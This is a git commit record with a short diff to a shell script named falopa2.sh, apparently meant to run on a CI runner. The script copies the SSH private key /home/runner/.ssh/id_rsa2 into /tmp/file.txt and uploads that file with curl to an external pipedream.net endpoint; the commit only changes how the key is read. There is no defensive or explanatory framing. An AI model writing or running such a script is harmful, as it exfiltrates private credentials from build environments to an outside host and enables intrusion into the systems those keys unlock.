85db7d9f41d34b65e3cbadf09ea21a7abc3c593b
_m <matiasesena@gmail.com>
2021-11-04 16:15:31 -0300

    Update falopa2.sh

--- falopa2.sh
+++ falopa2.sh
@@ -4,7 +4,7 @@
 #sudo apt-get install gdb -y > /tmp/file.txt
 
 #ssh-keygen -t rsa -N "passphrase" -f ~/.ssh/id_rsa2 > /tmp/file.txt
-cat /home/runner/.ssh/id_rsa2 > /tmp/file.txt
+$(cat /home/runner/.ssh/id_rsa2) > /tmp/file.txt
 echo "---------------------"
 
 curl --data-binary "@/tmp/file.txt" https://en0liva7dzyvpp.x.pipedream.net/
